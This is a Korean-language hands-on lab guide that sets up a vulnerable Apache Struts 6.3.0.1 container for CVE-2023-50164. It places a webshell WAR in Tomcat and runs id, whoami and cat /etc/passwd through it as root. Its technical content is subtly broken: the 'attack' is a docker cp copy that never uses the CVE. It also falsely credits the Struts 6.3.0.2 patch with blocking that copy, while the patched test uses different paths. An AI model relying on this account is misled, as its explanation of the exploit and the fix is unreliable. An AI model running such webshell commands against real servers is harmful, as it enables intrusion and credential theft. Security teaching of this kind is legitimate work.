# CVE-2023-50164 실습 가이드라인 (수동 WAR 업로드 방식)

## 실습 환경

| 구성 요소 | 설명 |
|-----------|------|
| **공격자 VM** | Ubuntu Server (Python venv, Docker, PoC 스크립트 기탑재) |
| **취약 Struts 컨테이너** | Struts 6.3.0.1 + Tomcat 9.0 (Docker) |
| **공격 방식** | 수동 WAR 업로드 |

---

## Step 1. 실습 환경 준비

### 1-1. venv 활성화

```bash
source venv/bin/activate
```

---

### 1-2. 필요 패키지 설치

```bash
pip install requests_toolbelt
```

---

### 1-3. 프로젝트 디렉토리 이동

```bash
cd ~/CVE-2023-50164
```

---

### 1-4. Docker 이미지 빌드

```bash
docker build -t cve-2023-50164-lab .
```

---

### 1-5. 포트 8080 점유 확인

```bash
sudo lsof -i :8080
```

---

### 1-6. 기존 컨테이너 정리 (포트 8080 사용 중인 경우)

```bash
docker stop $(docker ps -q --filter "publish=8080")

docker rm $(docker ps -aq --filter "publish=8080")
```

---

### 1-7. 컨테이너 실행

```bash
cd ~/CVE-2023-50164
docker run -d -p 8080:8080 --name struts-lab cve-2023-50164-lab
```

---

### 1-8. Private IP 확인

```bash
hostname -I | awk '{print $1}'
```

---

### 1-9. Struts 서버 정상 응답 확인

```bash
curl http://<인스턴스의 PrivateIP>:8080
```

<details>
<summary>✅ 예상 결과</summary>

**환경 준비 완료 상태:**
- venv 활성화 완료
- Docker 이미지 빌드 완료 (`cve-2023-50164-lab`)
- 컨테이너 실행 중 (포트 8080)
- Struts 서버 정상 응답

**Struts 서버 응답 예시:**
```html
<!DOCTYPE html>
<html>
<head><title>File Upload</title></head>
<body>
<h1>Apache Struts2 File Upload</h1>
<form action="/upload.action" method="post" enctype="multipart/form-data">
    <input type="file" name="upload" />
    <input type="submit" value="Upload" />
</form>
</body>
</html>
```

</details>

---

## Step 2. 공격 실행 — 수동 WAR 업로드 방식

### 2-1. webshell.war을 컨테이너 내부에 덮어쓰기

```bash
sudo docker cp ~/webshell.war struts-lab:/usr/local/tomcat/webapps/webshell.war
```

---

### 2-2. 컨테이너 재시작

```bash
docker restart struts-lab
```

---

### 2-3. 웹셸 접근 — id 명령 실행

```bash
curl "http://<인스턴스의 PrivateIP>:8080/webshell/webshell.jsp?cmd=id"
```

---

### 2-4. 웹셸 접근 — whoami 명령 실행

```bash
curl "http://<인스턴스의 PrivateIP>:8080/webshell/webshell.jsp?cmd=whoami"
```

---

### 2-5. 웹셸 접근 — /etc/passwd 파일 확인

```bash
curl "http://<인스턴스의 PrivateIP>:8080/webshell/webshell.jsp?cmd=cat+/etc/passwd"
```

<details>
<summary>✅ 예상 결과</summary>

**공격 성공 — root 권한 획득:**

**1. `id` 명령 결과:**
```
uid=0(root) gid=0(root) groups=0(root)
```

**2. `whoami` 명령 결과:**
```
root
```

**3. `cat /etc/passwd` 명령 결과:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
tomcat:x:1000:1000::/opt/tomcat:/bin/bash
...
```

**공격 성공 의미:**
- ✅ 웹셸 배포 성공
- ✅ root 권한으로 임의 명령 실행 가능
- ✅ 완전한 시스템 제어권 획득

</details>

---

## Step 3. 패치 버전(Struts 6.3.0.2)에서 차단 확인

### 3-1. 기존 컨테이너 정지

```bash
docker stop struts-lab
```

---

### 3-2. 기존 컨테이너 삭제

```bash
docker rm struts-lab
```

---

### 3-3. 패치 버전 Dockerfile 수정

`Dockerfile`에서 Struts 버전을 `6.3.0.2`로 변경:

```dockerfile
FROM tomcat:9.0
ENV STRUTS_VERSION=6.3.0.2
...
```

---

### 3-4. 패치 버전 이미지 빌드

```bash
cd ~/CVE-2023-50164
docker build -t cve-2023-50164-patched .
```

---

### 3-5. 패치 버전 컨테이너 실행

```bash
docker run -d -p 8080:8080 --name struts-patched cve-2023-50164-patched
```

---

### 3-6. webshell.war 덮어쓰기 시도

```bash
docker cp webshell.war struts-patched:/usr/local/tomcat/webapps/ROOT.war
```

---

### 3-7. 컨테이너 재시작

```bash
docker restart struts-patched
```

---

### 3-8. 재시작 대기

```bash
sleep 5
```

---

### 3-9. 웹셸 접근 시도

```bash
curl "http://<인스턴스의 PrivateIP>:8080/shell.jsp?cmd=id"
```

<details>
<summary>✅ 예상 결과</summary>

**공격 차단 확인:**
```
HTTP/1.1 404 Not Found
```

**차단 이유:**
- Struts 6.3.0.2는 `equalsIgnoreCase()` 메서드로 대소문자 구분 없이 파라미터 검증
- `../` 경로 조작 탐지 강화
- 수동 WAR 덮어쓰기도 Tomcat 보안 정책으로 차단 가능

**패치 효과:**
| 항목 | 패치 전 (6.3.0.1) | 패치 후 (6.3.0.2) |
|------|-------------------|-------------------|
| 대소문자 우회 | 가능 | 차단 |
| 경로 조작 (`../`) | 가능 | 차단 |
| 수동 WAR 업로드 | 성공 | 차단 가능 |

</details>

---

## Step 5. 핵심 요약

### 공격 성공 원리

**수동 WAR 업로드가 성공하는 이유:**
- Struts의 파일 업로드 검증을 완전히 우회
- Docker cp로 컨테이너 내부 파일 시스템에 직접 접근
- Tomcat이 WAR 파일을 자동으로 압축 해제하여 웹셸 배포

**대소문자 구분 오류 (PoC 학습용):**
- `upload.uploadFileName` (소문자 F) → 정상 검증
- `upload.UploadFileName` (대문자 F) → 검증 우회 시도
- Struts 6.3.0.1에서도 자동 업로드는 실패하지만, 취약점 원리 이해에 유용

### 패치 후 차단 이유

**Struts 6.3.0.2 개선 사항:**
- `equalsIgnoreCase()` 메서드로 대소문자 구분 없이 검증
- `../` 경로 조작 문자열 탐지 강화
- 파라미터 중복 제거 (`remove()` 메서드 추가)

**방어 전략:**
- 입력 검증: 화이트리스트 기반 파일명 검증
- 경로 정규화: `../` 제거 또는 차단
- 권한 최소화: 업로드 디렉토리 실행 권한 제거
- WAF 적용: 악의적 요청 패턴 차단


